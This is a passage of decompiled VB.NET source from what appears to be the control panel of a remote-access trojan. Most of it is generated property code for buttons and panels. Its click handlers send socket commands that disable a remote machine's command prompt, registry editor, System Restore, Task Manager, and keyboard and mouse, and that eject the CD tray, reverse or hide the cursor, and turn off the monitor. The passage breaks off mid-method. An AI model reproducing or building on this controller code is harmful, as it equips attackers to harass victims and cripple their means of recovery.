		Friend Overridable Property Button47 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button47
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button47_Click
				Dim flag As Boolean = Me._Button47 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button47.Click, value2
				End If
				Me._Button47 = value
				flag = (Me._Button47 IsNot Nothing)
				If flag Then
					AddHandler Me._Button47.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DF RID: 223
		' (get) Token: 0x06000258 RID: 600 RVA: 0x0015E8AC File Offset: 0x0015CCAC
		' (set) Token: 0x06000259 RID: 601 RVA: 0x0015E8C4 File Offset: 0x0015CCC4
		Friend Overridable Property Button48 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button48
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button48_Click
				Dim flag As Boolean = Me._Button48 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button48.Click, value2
				End If
				Me._Button48 = value
				flag = (Me._Button48 IsNot Nothing)
				If flag Then
					AddHandler Me._Button48.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E0 RID: 224
		' (get) Token: 0x0600025A RID: 602 RVA: 0x0015E924 File Offset: 0x0015CD24
		' (set) Token: 0x0600025B RID: 603 RVA: 0x0015E93C File Offset: 0x0015CD3C
		Friend Overridable Property Button49 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button49
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button49_Click
				Dim flag As Boolean = Me._Button49 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button49.Click, value2
				End If
				Me._Button49 = value
				flag = (Me._Button49 IsNot Nothing)
				If flag Then
					AddHandler Me._Button49.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E1 RID: 225
		' (get) Token: 0x0600025C RID: 604 RVA: 0x0015E99C File Offset: 0x0015CD9C
		' (set) Token: 0x0600025D RID: 605 RVA: 0x0015E9B4 File Offset: 0x0015CDB4
		Friend Overridable Property Button50 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button50
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button50_Click
				Dim flag As Boolean = Me._Button50 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button50.Click, value2
				End If
				Me._Button50 = value
				flag = (Me._Button50 IsNot Nothing)
				If flag Then
					AddHandler Me._Button50.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E2 RID: 226
		' (get) Token: 0x0600025E RID: 606 RVA: 0x0015EA14 File Offset: 0x0015CE14
		' (set) Token: 0x0600025F RID: 607 RVA: 0x0015EA2C File Offset: 0x0015CE2C
		Friend Overridable Property Button51 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button51
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button51_Click
				Dim flag As Boolean = Me._Button51 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button51.Click, value2
				End If
				Me._Button51 = value
				flag = (Me._Button51 IsNot Nothing)
				If flag Then
					AddHandler Me._Button51.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E3 RID: 227
		' (get) Token: 0x06000260 RID: 608 RVA: 0x0015EA8C File Offset: 0x0015CE8C
		' (set) Token: 0x06000261 RID: 609 RVA: 0x0015EAA4 File Offset: 0x0015CEA4
		Friend Overridable Property Button52 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button52
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button52_Click
				Dim flag As Boolean = Me._Button52 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button52.Click, value2
				End If
				Me._Button52 = value
				flag = (Me._Button52 IsNot Nothing)
				If flag Then
					AddHandler Me._Button52.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000E4 RID: 228
		' (get) Token: 0x06000262 RID: 610 RVA: 0x0015EB04 File Offset: 0x0015CF04
		' (set) Token: 0x06000263 RID: 611 RVA: 0x0015EB1C File Offset: 0x0015CF1C
		Friend Overridable Property Check_Sound As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Check_Sound
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._Check_Sound = value
			End Set
		End Property

		' Token: 0x170000E5 RID: 229
		' (get) Token: 0x06000264 RID: 612 RVA: 0x0015EB28 File Offset: 0x0015CF28
		' (set) Token: 0x06000265 RID: 613 RVA: 0x0015EB40 File Offset: 0x0015CF40
		Friend Overridable Property GroupBox20 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox20
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox20 = value
			End Set
		End Property

		' Token: 0x170000E6 RID: 230
		' (get) Token: 0x06000266 RID: 614 RVA: 0x0015EB4C File Offset: 0x0015CF4C
		' (set) Token: 0x06000267 RID: 615 RVA: 0x0015EB64 File Offset: 0x0015CF64
		Friend Overridable Property RadioButton10 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton10 = value
			End Set
		End Property

		' Token: 0x170000E7 RID: 231
		' (get) Token: 0x06000268 RID: 616 RVA: 0x0015EB70 File Offset: 0x0015CF70
		' (set) Token: 0x06000269 RID: 617 RVA: 0x0015EB88 File Offset: 0x0015CF88
		Friend Overridable Property RadioButton9 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton9 = value
			End Set
		End Property

		' Token: 0x170000E8 RID: 232
		' (get) Token: 0x0600026A RID: 618 RVA: 0x0015EB94 File Offset: 0x0015CF94
		' (set) Token: 0x0600026B RID: 619 RVA: 0x0015EBAC File Offset: 0x0015CFAC
		Friend Overridable Property RadioButton8 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton8 = value
			End Set
		End Property

		' Token: 0x170000E9 RID: 233
		' (get) Token: 0x0600026C RID: 620 RVA: 0x0015EBB8 File Offset: 0x0015CFB8
		' (set) Token: 0x0600026D RID: 621 RVA: 0x0015EBD0 File Offset: 0x0015CFD0
		Friend Overridable Property RadioButton7 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton7 = value
			End Set
		End Property

		' Token: 0x170000EA RID: 234
		' (get) Token: 0x0600026E RID: 622 RVA: 0x0015EBDC File Offset: 0x0015CFDC
		' (set) Token: 0x0600026F RID: 623 RVA: 0x0015EBF4 File Offset: 0x0015CFF4
		Friend Overridable Property RadioButton6 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton6 = value
			End Set
		End Property

		' Token: 0x170000EB RID: 235
		' (get) Token: 0x06000270 RID: 624 RVA: 0x0015EC00 File Offset: 0x0015D000
		' (set) Token: 0x06000271 RID: 625 RVA: 0x0015EC18 File Offset: 0x0015D018
		Friend Overridable Property RadioButton5 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton5 = value
			End Set
		End Property

		' Token: 0x170000EC RID: 236
		' (get) Token: 0x06000272 RID: 626 RVA: 0x0015EC24 File Offset: 0x0015D024
		' (set) Token: 0x06000273 RID: 627 RVA: 0x0015EC3C File Offset: 0x0015D03C
		Friend Overridable Property GroupBox22 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox22 = value
			End Set
		End Property

		' Token: 0x170000ED RID: 237
		' (get) Token: 0x06000274 RID: 628 RVA: 0x0015EC48 File Offset: 0x0015D048
		' (set) Token: 0x06000275 RID: 629 RVA: 0x0015EC60 File Offset: 0x0015D060
		Friend Overridable Property RadioButton4 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton4 = value
			End Set
		End Property

		' Token: 0x170000EE RID: 238
		' (get) Token: 0x06000276 RID: 630 RVA: 0x0015EC6C File Offset: 0x0015D06C
		' (set) Token: 0x06000277 RID: 631 RVA: 0x0015EC84 File Offset: 0x0015D084
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x170000EF RID: 239
		' (get) Token: 0x06000278 RID: 632 RVA: 0x0015EC90 File Offset: 0x0015D090
		' (set) Token: 0x06000279 RID: 633 RVA: 0x0015ECA8 File Offset: 0x0015D0A8
		Friend Overridable Property RadioButton3 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton3 = value
			End Set
		End Property

		' Token: 0x170000F0 RID: 240
		' (get) Token: 0x0600027A RID: 634 RVA: 0x0015ECB4 File Offset: 0x0015D0B4
		' (set) Token: 0x0600027B RID: 635 RVA: 0x0015ECCC File Offset: 0x0015D0CC
		Friend Overridable Property PictureBox3 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox3 = value
			End Set
		End Property

		' Token: 0x170000F1 RID: 241
		' (get) Token: 0x0600027C RID: 636 RVA: 0x0015ECD8 File Offset: 0x0015D0D8
		' (set) Token: 0x0600027D RID: 637 RVA: 0x0015ECF0 File Offset: 0x0015D0F0
		Friend Overridable Property RadioButton2 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton2 = value
			End Set
		End Property

		' Token: 0x170000F2 RID: 242
		' (get) Token: 0x0600027E RID: 638 RVA: 0x0015ECFC File Offset: 0x0015D0FC
		' (set) Token: 0x0600027F RID: 639 RVA: 0x0015ED14 File Offset: 0x0015D114
		Friend Overridable Property PictureBox2 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox2 = value
			End Set
		End Property

		' Token: 0x170000F3 RID: 243
		' (get) Token: 0x06000280 RID: 640 RVA: 0x0015ED20 File Offset: 0x0015D120
		' (set) Token: 0x06000281 RID: 641 RVA: 0x0015ED38 File Offset: 0x0015D138
		Friend Overridable Property RadioButton1 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton1 = value
			End Set
		End Property

		' Token: 0x170000F4 RID: 244
		' (get) Token: 0x06000282 RID: 642 RVA: 0x0015ED44 File Offset: 0x0015D144
		' (set) Token: 0x06000283 RID: 643 RVA: 0x0015ED5C File Offset: 0x0015D15C
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x170000F5 RID: 245
		' (get) Token: 0x06000284 RID: 644 RVA: 0x0015ED68 File Offset: 0x0015D168
		' (set) Token: 0x06000285 RID: 645 RVA: 0x0015ED80 File Offset: 0x0015D180
		Friend Overridable Property GroupBox21 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox21
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox21 = value
			End Set
		End Property

		' Token: 0x170000F6 RID: 246
		' (get) Token: 0x06000286 RID: 646 RVA: 0x0015ED8C File Offset: 0x0015D18C
		' (set) Token: 0x06000287 RID: 647 RVA: 0x0015EDA4 File Offset: 0x0015D1A4
		Friend Overridable Property TextBox5 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox5 = value
			End Set
		End Property

		' Token: 0x170000F7 RID: 247
		' (get) Token: 0x06000288 RID: 648 RVA: 0x0015EDB0 File Offset: 0x0015D1B0
		' (set) Token: 0x06000289 RID: 649 RVA: 0x0015EDC8 File Offset: 0x0015D1C8
		Friend Overridable Property TextBox6 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox6 = value
			End Set
		End Property

		' Token: 0x170000F8 RID: 248
		' (get) Token: 0x0600028A RID: 650 RVA: 0x0015EDD4 File Offset: 0x0015D1D4
		' (set) Token: 0x0600028B RID: 651 RVA: 0x0015EDEC File Offset: 0x0015D1EC
		Friend Overridable Property Button39 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button39
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button39_Click
				Dim flag As Boolean = Me._Button39 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button39.Click, value2
				End If
				Me._Button39 = value
				flag = (Me._Button39 IsNot Nothing)
				If flag Then
					AddHandler Me._Button39.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000F9 RID: 249
		' (get) Token: 0x0600028C RID: 652 RVA: 0x0015EE4C File Offset: 0x0015D24C
		' (set) Token: 0x0600028D RID: 653 RVA: 0x0015EE64 File Offset: 0x0015D264
		Friend Overridable Property Button38 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button38
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button38_Click
				Dim flag As Boolean = Me._Button38 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button38.Click, value2
				End If
				Me._Button38 = value
				flag = (Me._Button38 IsNot Nothing)
				If flag Then
					AddHandler Me._Button38.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FA RID: 250
		' (get) Token: 0x0600028E RID: 654 RVA: 0x0015EEC4 File Offset: 0x0015D2C4
		' (set) Token: 0x0600028F RID: 655 RVA: 0x0015EEDC File Offset: 0x0015D2DC
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x170000FB RID: 251
		' (get) Token: 0x06000290 RID: 656 RVA: 0x0015EEE8 File Offset: 0x0015D2E8
		' (set) Token: 0x06000291 RID: 657 RVA: 0x0015EF00 File Offset: 0x0015D300
		Friend Overridable Property Panel2 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel2 = value
			End Set
		End Property

		' Token: 0x170000FC RID: 252
		' (get) Token: 0x06000292 RID: 658 RVA: 0x0015EF0C File Offset: 0x0015D30C
		' (set) Token: 0x06000293 RID: 659 RVA: 0x0015EF24 File Offset: 0x0015D324
		Friend Overridable Property Panel4 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel4 = value
			End Set
		End Property

		' Token: 0x170000FD RID: 253
		' (get) Token: 0x06000294 RID: 660 RVA: 0x0015EF30 File Offset: 0x0015D330
		' (set) Token: 0x06000295 RID: 661 RVA: 0x0015EF48 File Offset: 0x0015D348
		Friend Overridable Property Button53 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button53
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button53_Click
				Dim flag As Boolean = Me._Button53 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button53.Click, value2
				End If
				Me._Button53 = value
				flag = (Me._Button53 IsNot Nothing)
				If flag Then
					AddHandler Me._Button53.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000FE RID: 254
		' (get) Token: 0x06000296 RID: 662 RVA: 0x0015EFA8 File Offset: 0x0015D3A8
		' (set) Token: 0x06000297 RID: 663 RVA: 0x0015EFC0 File Offset: 0x0015D3C0
		Friend Overridable Property Panel6 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel6 = value
			End Set
		End Property

		' Token: 0x170000FF RID: 255
		' (get) Token: 0x06000298 RID: 664 RVA: 0x0015EFCC File Offset: 0x0015D3CC
		' (set) Token: 0x06000299 RID: 665 RVA: 0x0015EFE4 File Offset: 0x0015D3E4
		Friend Overridable Property Button55 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button55
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button55_Click
				Dim flag As Boolean = Me._Button55 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button55.Click, value2
				End If
				Me._Button55 = value
				flag = (Me._Button55 IsNot Nothing)
				If flag Then
					AddHandler Me._Button55.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000100 RID: 256
		' (get) Token: 0x0600029A RID: 666 RVA: 0x0015F044 File Offset: 0x0015D444
		' (set) Token: 0x0600029B RID: 667 RVA: 0x0015F05C File Offset: 0x0015D45C
		Friend Overridable Property Panel7 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel7 = value
			End Set
		End Property

		' Token: 0x17000101 RID: 257
		' (get) Token: 0x0600029C RID: 668 RVA: 0x0015F068 File Offset: 0x0015D468
		' (set) Token: 0x0600029D RID: 669 RVA: 0x0015F080 File Offset: 0x0015D480
		Friend Overridable Property GroupBox16 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox16 = value
			End Set
		End Property

		' Token: 0x17000102 RID: 258
		' (get) Token: 0x0600029E RID: 670 RVA: 0x0015F08C File Offset: 0x0015D48C
		' (set) Token: 0x0600029F RID: 671 RVA: 0x0015F0A4 File Offset: 0x0015D4A4
		Friend Overridable Property Button34 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button34
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button34_Click
				Dim flag As Boolean = Me._Button34 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button34.Click, value2
				End If
				Me._Button34 = value
				flag = (Me._Button34 IsNot Nothing)
				If flag Then
					AddHandler Me._Button34.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000103 RID: 259
		' (get) Token: 0x060002A0 RID: 672 RVA: 0x0015F104 File Offset: 0x0015D504
		' (set) Token: 0x060002A1 RID: 673 RVA: 0x0015F11C File Offset: 0x0015D51C
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x17000104 RID: 260
		' (get) Token: 0x060002A2 RID: 674 RVA: 0x0015F128 File Offset: 0x0015D528
		' (set) Token: 0x060002A3 RID: 675 RVA: 0x0015F140 File Offset: 0x0015D540
		Friend Overridable Property GroupBox3 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox3 = value
			End Set
		End Property

		' Token: 0x17000105 RID: 261
		' (get) Token: 0x060002A4 RID: 676 RVA: 0x0015F14C File Offset: 0x0015D54C
		' (set) Token: 0x060002A5 RID: 677 RVA: 0x0015F164 File Offset: 0x0015D564
		Friend Overridable Property Button5 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button5_Click
				Dim flag As Boolean = Me._Button5 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button5.Click, value2
				End If
				Me._Button5 = value
				flag = (Me._Button5 IsNot Nothing)
				If flag Then
					AddHandler Me._Button5.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000106 RID: 262
		' (get) Token: 0x060002A6 RID: 678 RVA: 0x0015F1C4 File Offset: 0x0015D5C4
		' (set) Token: 0x060002A7 RID: 679 RVA: 0x0015F1DC File Offset: 0x0015D5DC
		Friend Overridable Property Button6 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button6_Click
				Dim flag As Boolean = Me._Button6 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button6.Click, value2
				End If
				Me._Button6 = value
				flag = (Me._Button6 IsNot Nothing)
				If flag Then
					AddHandler Me._Button6.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000107 RID: 263
		' (get) Token: 0x060002A8 RID: 680 RVA: 0x0015F23C File Offset: 0x0015D63C
		' (set) Token: 0x060002A9 RID: 681 RVA: 0x0015F254 File Offset: 0x0015D654
		Friend Overridable Property Button7 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button7_Click
				Dim flag As Boolean = Me._Button7 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button7.Click, value2
				End If
				Me._Button7 = value
				flag = (Me._Button7 IsNot Nothing)
				If flag Then
					AddHandler Me._Button7.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060002AA RID: 682 RVA: 0x0015F2B4 File Offset: 0x0015D6B4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.s.Send("OpenCD")
		End Sub

		' Token: 0x060002AB RID: 683 RVA: 0x0015F2CC File Offset: 0x0015D6CC
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Me.s.Send("CloseCD")
		End Sub

		' Token: 0x060002AC RID: 684 RVA: 0x0015F2E4 File Offset: 0x0015D6E4
		Private Sub Button17_Click(sender As Object, e As EventArgs)
			Me.s.Send("ReverseMouse")
		End Sub

		' Token: 0x060002AD RID: 685 RVA: 0x0015F2FC File Offset: 0x0015D6FC
		Private Sub Button16_Click(sender As Object, e As EventArgs)
			Me.s.Send("NormalMouse")
		End Sub

		' Token: 0x060002AE RID: 686 RVA: 0x0015F314 File Offset: 0x0015D714
		Private Sub Button13_Click(sender As Object, e As EventArgs)
			Me.s.Send("DisableCMD")
		End Sub

		' Token: 0x060002AF RID: 687 RVA: 0x0015F32C File Offset: 0x0015D72C
		Private Sub Button12_Click(sender As Object, e As EventArgs)
			Me.s.Send("DisableRegistry")
		End Sub

		' Token: 0x060002B0 RID: 688 RVA: 0x0015F344 File Offset: 0x0015D744
		Private Sub Button18_Click(sender As Object, e As EventArgs)
			Me.s.Send("DisableRegistry")
		End Sub

		' Token: 0x060002B1 RID: 689 RVA: 0x0015F35C File Offset: 0x0015D75C
		Private Sub Button19_Click(sender As Object, e As EventArgs)
			Me.s.Send("EnableRegistry")
		End Sub

		' Token: 0x060002B2 RID: 690 RVA: 0x0015F374 File Offset: 0x0015D774
		Private Sub Button20_Click(sender As Object, e As EventArgs)
			Me.s.Send("DisableRestore")
		End Sub

		' Token: 0x060002B3 RID: 691 RVA: 0x0015F38C File Offset: 0x0015D78C
		Private Sub Button21_Click(sender As Object, e As EventArgs)
			Me.s.Send("EnableRestore")
		End Sub

		' Token: 0x060002B4 RID: 692 RVA: 0x0015F3A4 File Offset: 0x0015D7A4
		Private Sub Button22_Click(sender As Object, e As EventArgs)
			Me.s.Send("DisableTaskManager")
		End Sub

		' Token: 0x060002B5 RID: 693 RVA: 0x0015F3BC File Offset: 0x0015D7BC
		Private Sub Button23_Click(sender As Object, e As EventArgs)
			Me.s.Send("EnableTaskManager")
		End Sub

		' Token: 0x060002B6 RID: 694 RVA: 0x0015F3D4 File Offset: 0x0015D7D4
		Private Sub Button28_Click(sender As Object, e As EventArgs)
			Me.s.Send("CursorHide")
		End Sub

		' Token: 0x060002B7 RID: 695 RVA: 0x0015F3EC File Offset: 0x0015D7EC
		Private Sub Button29_Click(sender As Object, e As EventArgs)
			Me.s.Send("CursorShow")
		End Sub

		' Token: 0x060002B8 RID: 696 RVA: 0x0015F404 File Offset: 0x0015D804
		Private Sub Button14_Click(sender As Object, e As EventArgs)
			Me.s.Send("TurnOnMonitor")
		End Sub

		' Token: 0x060002B9 RID: 697 RVA: 0x0015F41C File Offset: 0x0015D81C
		Private Sub Button15_Click(sender As Object, e As EventArgs)
			Me.s.Send("TurnOffMonitor")
		End Sub

		' Token: 0x060002BA RID: 698 RVA: 0x0015F434 File Offset: 0x0015D834
		Private Sub Button4_Click(sender As Object, e As EventArgs)
			Me.s.Send("DisableKM")
		End Sub

		' Token: 0x060002BB RID: 699 RVA: 0x0015F44C File Offset: 0x0015D84C
		Private Sub Button3_Click(sender As Object, e As EventArgs)
			Me.s.Send("EnableKM")
		End Sub

		' Token: 0x060002BC RID: 700
		Public Declare Sub Beep Lib "KERNEL32.DLL" (freq As Integer, dur As Integer)

		' Token: 0x060002BD RID: 701 RVA: 0x0015F464 File Offset: 0x0015D864
		Private Sub Button52_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 361) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(361, 300)
			End If
		End Sub

		' Token: 0x060002BE RID: 702 RVA: 0x0015F4E4 File Offset: 0x0015D8E4
		Private Sub Button44_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 277) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(277, 300)
			End If
		End Sub

		' Token: 0x060002BF RID: 703 RVA: 0x0015F564 File Offset: 0x0015D964
		Private Sub Button51_Click(sender As Object, e As EventArgs)
			NewLateBinding.LateCall(Me.s, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("piano", MyProject.Forms.Form1.Yy), 393) }, Nothing, Nothing, Nothing, True)
			Dim flag As Boolean = Not Me.Check_Sound.Checked
			If Not flag Then
				fun.Beep(393, 300)
			End If
		End Sub

		' Token: 0x060002C0 RID: 704 RVA: 0x0015F5E4 File Offset: 0x0015D9E4
		Private Sub Button43_Click(sender As Object, e As EventArgs)
